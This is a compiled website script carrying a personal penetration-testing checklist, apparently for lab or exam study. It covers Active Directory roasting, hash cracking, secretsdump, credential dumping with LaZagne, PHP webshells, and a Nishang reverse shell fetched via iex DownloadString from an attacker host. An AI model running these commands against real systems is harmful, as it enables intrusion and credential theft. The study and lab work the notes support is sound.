"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[340],{4631:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>t,contentTitle:()=>d,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"procedure/Procedure","title":"Procedure","description":"Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert or smth!","source":"@site/docs/procedure/Procedure.md","sourceDirName":"procedure","slug":"/procedure/","permalink":"/portfolio/docs/procedure/","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1765120889000,"sidebarPosition":1,"frontMatter":{"sidebar_position":1},"sidebar":"docsSidebar","previous":{"title":"Procedure","permalink":"/portfolio/docs/category/procedure"},"next":{"title":"File Upload","permalink":"/portfolio/docs/procedure/File Upload"}}');var i=n(4848),o=n(8453);const l={sidebar_position:1},d="Enumeration/Initial Access",t={},a=[{value:"1. Run begin.sh (basically autorecon)",id:"1-run-beginsh-basically-autorecon",level:2},{value:"2. After nmap full port scan is done",id:"2-after-nmap-full-port-scan-is-done",level:2},{value:"3. After everything is done",id:"3-after-everything-is-done",level:2},{value:"Linux",id:"linux",level:2},{value:"1. LinPEAS",id:"1-linpeas",level:3},{value:"2. pspy",id:"2-pspy",level:3},{value:"Windows",id:"windows",level:2},{value:"No curl and iwr",id:"no-curl-and-iwr",level:3},{value:"Upgrade your shell",id:"upgrade-your-shell",level:4},{value:"Run as other user",id:"run-as-other-user",level:3},{value:"1. WinPEAS",id:"1-winpeas",level:3},{value:"2. LaZagne",id:"2-lazagne",level:3}];function c(e){const r={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components},{Details:n}=r;return n||function(e,r){throw new Error("Expected "+(r?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(r.p,{children:"Sidenote: FTP are often unstable so if ftp / ftp files fails/corrupted go revert or smth!"}),"\n",(0,i.jsx)(r.header,{children:(0,i.jsx)(r.h1,{id:"enumerationinitial-access",children:"Enumeration/Initial Access"})}),"\n",(0,i.jsx)(r.h2,{id:"1-run-beginsh-basically-autorecon",children:"1. Run begin.sh (basically autorecon)"}),"\n",(0,i.jsxs)(n,{children:[(0,i.jsxs)(r.p,{children:["While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Look out for non-standard tags like ",(0,i.jsx)(r.code,{children:"<wp-includes>"})," and search them up. Do ",(0,i.jsx)("a",{href:"./general/Connecting",children:"anonymous login"})," for any main services identified also."]}),(0,i.jsx)(r.p,{children:"If AD detected:"}),(0,i.jsxs)(n,{children:[(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"Run dnsrecon"}),"\n"]}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"dnsrecon -d <a machine> -r <subnet range /8>"})," (eg ",(0,i.jsx)(r.code,{children:"dnsrecon -d 10.10.10.100 -r 10.0.0.0/8"}),")"]})}),(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"Check for AS-REP roasting"}),"\n"]}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:["Run ",(0,i.jsx)(r.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>"})," (eg ",(0,i.jsx)(r.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>"}),"). Then run ",(0,i.jsx)(r.code,{children:'hashcat --help | grep -i "Kerberos"'})," and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run ",(0,i.jsx)(r.code,{children:"sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]})}),(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"(Requires user and plaintext password) Get a shell on victim"}),"\n"]}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"impacket-psexec <domain>/<user>:<pw>@<dc ip>"})," Make sure its / not . Also only works if the user has sufficient perms"]})}),(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"(Requires user and plaintext password) Check for Kerberoasting"}),"\n"]}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>"})," then ",(0,i.jsx)(r.code,{children:"sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]})}),(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"(Requires user and plaintext password) [Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse"}),"\n"]}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip>"})," (eg ",(0,i.jsx)(r.code,{children:'impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\\!"@192.168.50.70'}),")"]})}),(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"(Requires user and plaintext password) Bloodhound it from Windows VM"}),"\n"]}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:["connect to the vpn on your windows vm. make sure u can ping the machine, then ",(0,i.jsx)(r.code,{children:".\\SharpHound.exe -c all -d <domain> --domaincontroller <dc ip>"}),". if not working, go Control Panel > Network and Ethernet > Network and Sharing Center > Change adapter settings (on the left bar) > Right-click either and go to properties > doubleclick on IPv4 properties > Preferred DNS server change to the DC IP i think. if still dont work change the other ethernet/interface"]})})]}),(0,i.jsxs)(r.p,{children:["If SMB detected: ",(0,i.jsx)(r.a,{href:"/docs/general/SMB",children:"SMB"})]}),(0,i.jsx)(r.p,{children:"If fetched files from SMB or FTP, run filescanner from cybertools."})]}),"\n",(0,i.jsx)(r.h2,{id:"2-after-nmap-full-port-scan-is-done",children:"2. After nmap full port scan is done"}),"\n",(0,i.jsxs)(n,{children:[(0,i.jsx)(r.p,{children:"List down all ports and prioritise which to look thru first."}),(0,i.jsx)(r.p,{children:"Look thru full nmap scan for any definitive versions and add that to software/versions list."})]}),"\n",(0,i.jsx)(r.h2,{id:"3-after-everything-is-done",children:"3. After everything is done"}),"\n",(0,i.jsx)(n,{children:(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:"Check feroxbuster for HTTP ports"}),"\n",(0,i.jsx)(r.li,{children:"Check patterns for any new identified software or CVEs"}),"\n"]})}),"\n",(0,i.jsx)(r.h1,{id:"privesc",children:"PrivEsc"}),"\n",(0,i.jsx)(r.h2,{id:"linux",children:"Linux"}),"\n",(0,i.jsxs)(n,{children:[(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"su <user>"})," to lateral move to another user if u know pw"]}),(0,i.jsx)(r.h3,{id:"1-linpeas",children:"1. LinPEAS"}),(0,i.jsxs)(r.p,{children:["Try to ",(0,i.jsx)(r.a,{href:"/docs/general/Download%20&%20Upload",children:"upload"})," LinPEAS and run it. If you can, follow the steps ",(0,i.jsx)(r.a,{href:"/docs/procedure/LinPEAS",children:"here"})]}),(0,i.jsx)(r.h3,{id:"2-pspy",children:"2. pspy"}),(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.a,{href:"/docs/general/Download%20&%20Upload",children:"Upload"})," pspy64 then run ",(0,i.jsx)(r.code,{children:"./pspy64"})]}),(0,i.jsxs)(r.ol,{start:"3",children:["\n",(0,i.jsx)(r.li,{children:'look out for \u201cAnalyzing Wordpress Files (limit 70)"'}),"\n"]})]}),"\n",(0,i.jsx)(r.h2,{id:"windows",children:"Windows"}),"\n",(0,i.jsxs)(n,{children:[(0,i.jsxs)(r.p,{children:["if 32-bit (x86), use ",(0,i.jsx)(r.a,{href:"https://www.exploit-db.com/exploits/40564",children:"https://www.exploit-db.com/exploits/40564"})]}),(0,i.jsxs)(r.p,{children:["if you only have modify perms, ",(0,i.jsx)(r.code,{children:"move orig_file orig_file.bak"})," then u can download ur malicious file"]}),(0,i.jsxs)(r.p,{children:["if u are in the system and there is an apache user, u can try to copy php webshells directly into C:\\xampp\\htdocs and access it on the website via ",(0,i.jsx)(r.code,{children:"/<filename>"})," and then run a reverse shell from that webshell, allowing u to access the apache user"]}),(0,i.jsx)(r.h3,{id:"no-curl-and-iwr",children:"No curl and iwr"}),(0,i.jsxs)(n,{children:[(0,i.jsxs)(r.p,{children:["if u can run powershell commands on cmd (test using ",(0,i.jsx)(r.code,{children:"powershell whoami"}),") u can:"]}),(0,i.jsx)(r.h4,{id:"upgrade-your-shell",children:"Upgrade your shell"}),(0,i.jsxs)(n,{children:[(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.code,{children:"cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 nishang.ps1"})," , copy one of the commands in the top of the file (eg ",(0,i.jsx)(r.code,{children:"Invoke-PowerShellTcp -Reverse -IPAddress <kali ip> -Port <port>"}),") and paste it at the bottom. ",(0,i.jsx)(r.strong,{children:"Remember not to copy the \u201cPS >\u201d part!!"})]}),(0,i.jsxs)(r.p,{children:["Then save the file and ",(0,i.jsx)(r.code,{children:"python3 -m http.server 8000"})," and then ",(0,i.jsx)(r.code,{children:'iex (New-Object Net.WebClient).DownloadString("http://<kali ip>:<port>/nishang.ps1")'})]})]}),(0,i.jsx)(r.p,{children:"You can also run any ps1 file using IEX (see the upgrade shell dropdown above for the command). u can run like winpeas.ps1 or jaws-enum.ps1"})]}),(0,i.jsx)(r.h3,{id:"run-as-other-user",children:"Run as other user"}),(0,i.jsx)(r.p,{children:"If you have the user + plaintext password of another user"}),(0,i.jsxs)(n,{children:[(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-powershell",children:"$secPassword = ConvertTo-SecureString '<pw>' -AsPlainText -Force\r\n$myCreds = New-Object System.Management.Automation.PSCredential('<domain>\\<user>', $secPassword)\r\nStart-Process -FilePath \"cmd.exe\" -Credential $myCreds -NoNewWindow\n"})}),(0,i.jsx)(r.p,{children:"if wrong pw u'll see this"}),(0,i.jsx)(r.pre,{children:(0,i.jsx)(r.code,{className:"language-powershell",children:'PS C:\\xampp\\htdocs> Start-Process -FilePath "cmd.exe" -Credential $myCreds\r\nStart-Process -FilePath "cmd.exe" -Credential $myCreds\r\nStart-Process : This command cannot be run due to the error: The user name or password is incorrect.\r\nAt line:1 char:1\r\n+ Start-Process -FilePath "cmd.exe" -Credential $myCreds\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException\r\n    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand\n'})})]}),(0,i.jsx)(r.h3,{id:"1-winpeas",children:"1. WinPEAS"}),(0,i.jsxs)(r.p,{children:["Try to ",(0,i.jsx)(r.a,{href:"/docs/general/Download%20&%20Upload",children:"upload"})," WinPEAS and run it. If you can, follow the steps ",(0,i.jsx)(r.a,{href:"/docs/procedure/WinPEAS",children:"here"})]}),(0,i.jsx)(r.h3,{id:"2-lazagne",children:"2. LaZagne"}),(0,i.jsx)(n,{children:(0,i.jsxs)(r.p,{children:[(0,i.jsx)(r.a,{href:"/docs/general/Download%20&%20Upload",children:"Upload"})," LaZagne to victim then ",(0,i.jsx)(r.code,{children:"./LaZagne.exe all"})]})})]}),"\n",(0,i.jsx)(r.p,{children:"If found:"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsxs)(r.li,{children:["Weird files that you can't open: run ",(0,i.jsx)(r.code,{children:"strings <file>"})," and verify that it is unencrypted (u can make out full strings of english or whatnot), if it is make a wordlist: ",(0,i.jsx)(r.code,{children:"strings -n 8 backup.mdb | sort -u > <filename>.txt"}),", then run it against whatever stuff needs like a pw for it. [WIP, im gonna need a pipeline if im going to make a wordlist for every unopenable weird file that I find]"]}),"\n",(0,i.jsxs)(r.li,{children:["NTLM hash: refer to ",(0,i.jsx)(r.a,{href:"/docs/procedure/NTLM",children:"NTLM"})]}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/general/AD#enumeration",children:"AD"})}),"\n",(0,i.jsxs)(r.li,{children:["cpassword hash: ",(0,i.jsx)(r.code,{children:"gpp-decrypt.py <hash>"})]}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/procedure/phpinfo",children:"phpinfo"})}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/procedure/File%20Upload",children:"File Upload"})}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/procedure/Wordpress",children:"Wordpress"})}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/general/Reverse%20Shell#sql--php-reverse-shell",children:"SQL & PHP"})}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/procedure/Password%20protected%20files",children:"Password protected files"})}),"\n",(0,i.jsxs)(r.li,{children:[".pst: ",(0,i.jsx)(r.code,{children:"readpst <file>"})," then just open the resulting mdap file, should be readable in vscode"]}),"\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"/docs/procedure/MongoDB",children:".mdb, MongoDB"})}),"\n"]}),"\n",(0,i.jsx)(r.p,{children:"Errors:"}),"\n",(0,i.jsxs)(r.ul,{children:["\n",(0,i.jsx)(r.li,{children:(0,i.jsx)(r.a,{href:"https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069",children:"Clock skew too great"})}),"\n"]})]})}function h(e={}){const{wrapper:r}={...(0,o.R)(),...e.components};return r?(0,i.jsx)(r,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},8453:(e,r,n)=>{n.d(r,{R:()=>l,x:()=>d});var s=n(6540);const i={},o=s.createContext(i);function l(e){const r=s.useContext(o);return s.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function d(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:l(e.components),s.createElement(o.Provider,{value:r},e.children)}}}]);